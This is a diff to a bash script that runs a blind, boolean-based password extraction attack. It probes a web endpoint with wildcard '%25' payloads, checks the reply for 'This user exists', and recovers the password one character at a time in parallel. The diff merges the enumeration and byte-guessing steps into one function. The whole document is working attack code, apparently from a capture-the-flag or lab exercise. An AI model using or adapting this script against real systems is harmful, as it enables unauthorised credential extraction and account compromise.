@@ -23,20 +23,16 @@ function perform_request(){
       --max-time 15
 }
 
-function enum_alphabet(){
-    perform_request "%25$1" | grep "This user exists" > /dev/null && echo "$1" >> alfabeto
+function brute_force_byte(){
+    perform_request $1 | grep "This user exists" > /dev/null && echo "$1" >> $2 
 }
 
 function enum_alphabet_parallel(){
-    for letter in {A..Z} {a..z} {0..9}; do echo "$letter"; done | parallel --max-args=1 enum_alphabet
-}
-
-function brute_force_byte(){
-    perform_request $PASSWORD$1 | grep "This user exists" > /dev/null && echo "$1" > current_byte
+    for letter in {A..Z} {a..z} {0..9}; do echo -e "%25$letter\nalfabeto"; done | parallel --max-args=2 brute_force_byte
 }
 
 function brute_force_byte_parallel(){
-    for letter in `cat alfabeto`; do echo "$letter"; done | parallel --max-args=1 brute_force_byte
+    for letter in `cat alfabeto`; do echo -e "$PASSWORD$letter\ncurrent_byte"; done | parallel --max-args=2 brute_force_byte 
 }
 
 function brute_force(){
@@ -52,7 +48,7 @@ function main(){
     brute_force
 }
 
-export -f {perform_request,enum_alphabet,brute_force_byte,brute_force_byte_parallel,brute_force}
+export -f {perform_request,brute_force_byte,brute_force_byte_parallel,brute_force}
 
 main
 
